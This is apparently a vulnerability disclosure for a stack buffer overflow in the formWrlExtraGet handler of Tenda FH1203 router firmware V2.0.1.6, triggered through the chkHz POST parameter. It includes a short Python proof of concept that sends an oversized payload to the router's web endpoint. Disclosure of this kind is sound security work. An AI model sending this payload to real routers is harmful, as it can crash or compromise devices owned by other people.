

# formWrlExtraGet

## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2495.html

## Affected version

FH1203 V2.0.1.6

## Vulnerability details

There is a stack buffer overflow vulnerability in  FH1203 V2.0.1.6, located in the **formWrlExtraGet** function. The function receives the `chkHz` parameter from a POST request. ` strcat(v60, src);` The statement will cause a buffer overflow. The `chkHz` value provided by the user may exceed the capacity of the `v60` array, thereby triggering this security vulnerability.


![image](https://github.com/user-attachments/assets/8c03a7ba-e77f-47b4-ab99-1a2cbaecb2d9)



## POC

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/WrlExtraGet"
payload = b"a"*7000

data = {"chkHz": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image](https://github.com/user-attachments/assets/fb737163-3458-4e23-bf14-cf7e794c1f54)
